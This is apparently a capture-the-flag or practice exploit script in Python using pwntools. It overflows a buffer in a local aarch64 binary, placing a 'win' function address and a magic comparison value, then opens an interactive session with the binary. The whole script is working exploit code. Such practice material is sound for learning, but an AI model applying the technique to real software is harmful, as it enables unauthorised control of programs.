#!/usr/bin/env python3
import pwn

# Target: aarch64

OFFSET_CMP = 32
CMP_VALUE = 1337
WIN_ADDR = 0x400704

buf = pwn.p64(WIN_ADDR)
buf = buf.ljust(OFFSET_CMP, b'A')
buf += pwn.p32(CMP_VALUE)

with open("payload.bin", "wb") as fp:
    fp.write(buf)

pwn.log.info("Payload")
print(pwn.hexdump(buf, width=16))

r = pwn.process("./a.out")
r.writeline(buf)
r.interactive()
